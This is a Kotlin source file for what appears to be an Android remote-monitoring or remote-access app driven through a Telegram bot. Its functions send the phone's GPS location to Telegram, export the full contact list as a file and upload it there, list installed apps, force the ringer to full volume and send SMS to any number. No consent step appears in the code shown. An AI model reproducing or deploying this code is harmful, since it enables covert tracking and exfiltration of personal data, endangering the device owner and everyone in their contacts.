package com.dec.monitor.system

import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.AudioManager
import android.media.RingtoneManager
import android.os.BatteryManager
import android.os.Bundle
import android.telephony.SmsManager
import com.dec.monitor.TelegramBot
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeoutOrNull
import java.io.File
import java.io.FileWriter
import android.provider.ContactsContract
import kotlin.coroutines.resume

object DeviceInfo {

    fun getBatteryInfo(context: Context): String {
        val intent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = intent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = intent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        val pct = if (scale > 0) (level * 100 / scale) else -1
        val status = intent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
        val charging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                status == BatteryManager.BATTERY_STATUS_FULL
        val plugged = intent?.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1)
        val plugType = when (plugged) {
            BatteryManager.BATTERY_PLUGGED_USB -> "USB"
            BatteryManager.BATTERY_PLUGGED_AC -> "AC"
            BatteryManager.BATTERY_PLUGGED_WIRELESS -> "Wireless"
            else -> "Not charging"
        }
        return "$pct% — ${if (charging) "Charging ($plugType)" else "Not charging"}"
    }

    suspend fun getLocation(context: Context) = withContext(Dispatchers.Main) {
        try {
            val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager

            val enabledProviders = lm.getProviders(true)
            if (enabledProviders.isEmpty()) {
                TelegramBot.sendMessage("📍 Location is OFF on device — please enable GPS")
                return@withContext
            }

            // try last known first across all providers
            var best: Location? = null
            for (provider in listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER, LocationManager.PASSIVE_PROVIDER)) {
                try {
                    @Suppress("MissingPermission")
                    val loc = lm.getLastKnownLocation(provider)
                    if (loc != null) {
                        if (best == null || loc.accuracy < best.accuracy) {
                            best = loc
                        }
                    }
                } catch (e: Exception) { continue }
            }

            if (best != null) {
                sendLocationMessage(best)
                return@withContext
            }

            // no last known — request fresh with timeout
            TelegramBot.sendMessage("📍 Requesting fresh location...")

            val freshLocation = withTimeoutOrNull(15000) {
                suspendCancellableCoroutine { cont ->
                    val listener = object : LocationListener {
                        override fun onLocationChanged(loc: Location) {
                            lm.removeUpdates(this)
                            if (cont.isActive) cont.resume(loc)
                        }
                        @Deprecated("Deprecated in Java")
                        override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
                        override fun onProviderEnabled(provider: String) {}
                        override fun onProviderDisabled(provider: String) {}
                    }

                    cont.invokeOnCancellation { lm.removeUpdates(listener) }

                    val provider = when {
                        lm.isProviderEnabled(LocationManager.GPS_PROVIDER) -> LocationManager.GPS_PROVIDER
                        lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER) -> LocationManager.NETWORK_PROVIDER
                        else -> null
                    }

                    if (provider != null) {
                        try {
                            @Suppress("MissingPermission")
                            lm.requestLocationUpdates(provider, 0L, 0f, listener)
                        } catch (e: Exception) {
                            if (cont.isActive) cont.resume(null)
                        }
                    } else {
                        if (cont.isActive) cont.resume(null)
                    }
                }
            }

            if (freshLocation != null) {
                sendLocationMessage(freshLocation)
            } else {
                TelegramBot.sendMessage("📍 Location timeout — GPS signal weak, try outdoors")
            }

        } catch (e: Exception) {
            TelegramBot.sendMessage("📍 Location error: ${e.message}")
        }
    }

    private suspend fun sendLocationMessage(loc: Location) {
        val mapsUrl = "https://maps.google.com/?q=${loc.latitude},${loc.longitude}"
        val accuracy = "±${loc.accuracy.toInt()}m"
        TelegramBot.sendMessage(
            "📍 <b>Location</b>\nLat: ${loc.latitude}\nLon: ${loc.longitude}\nAccuracy: $accuracy\n<a href=\"$mapsUrl\">Open in Maps</a>"
        )
    }

    suspend fun getContacts(context: Context) = withContext(Dispatchers.IO) {
        try {
            val sb = StringBuilder()
            val cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                ),
                null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            )

            cursor?.use {
                while (it.moveToNext()) {
                    val name = it.getString(0) ?: "Unknown"
                    val number = it.getString(1) ?: ""
                    sb.appendLine("$name — $number")
                }
            }

            val file = File(context.cacheDir, "contacts.txt")
            FileWriter(file).use { it.write(sb.toString()) }
            TelegramBot.sendDocument(file, "📒 Contacts — ${sb.lines().size} entries")
        } catch (e: Exception) {
            TelegramBot.sendMessage("📒 Contacts error: ${e.message}")
        }
    }

    fun getInstalledApps(context: Context): String {
        val pm = context.packageManager
        val packages = pm.getInstalledApplications(0)
        return packages
            .filter { pm.getLaunchIntentForPackage(it.packageName) != null }
            .joinToString("\n") { pm.getApplicationLabel(it).toString() }
            .take(3000)
    }

    fun ringDevice(context: Context) {
        try {
            val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            am.ringerMode = AudioManager.RINGER_MODE_NORMAL
            am.setStreamVolume(AudioManager.STREAM_RING, am.getStreamMaxVolume(AudioManager.STREAM_RING), 0)
            val ringtone = RingtoneManager.getRingtone(
                context,
                RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
            )
            ringtone.play()
        } catch (e: Exception) { }
    }

    fun sendSms(context: Context, number: String, message: String) {
        try {
            val smsManager = SmsManager.getDefault()
            val parts = smsManager.divideMessage(message)
            smsManager.sendMultipartTextMessage(number, null, parts, null, null)
        } catch (e: Exception) { }
    }
}
